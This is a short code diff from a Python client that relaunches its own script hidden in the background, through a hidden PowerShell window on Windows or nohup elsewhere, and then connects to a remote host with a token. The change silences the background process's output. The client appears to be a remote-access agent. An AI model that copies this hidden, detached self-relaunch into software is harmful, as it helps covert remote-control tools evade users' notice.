@@ -221,7 +221,7 @@ def async_client(host: str, port: int, token: str, seks: bool = True) -> None:
             p = Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True)
             p.communicate(f"Start-Process -FilePath '{sys.executable}' -WindowStyle Hidden -ArgumentList '{__file__}'")
         else:
-            Popen([f"nohup '{sys.executable}' '{__file__}'"], shell=True)
+            Popen([f"nohup '{sys.executable}' '{__file__}'"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     asyncio.run(am_main(host, port, token))
 
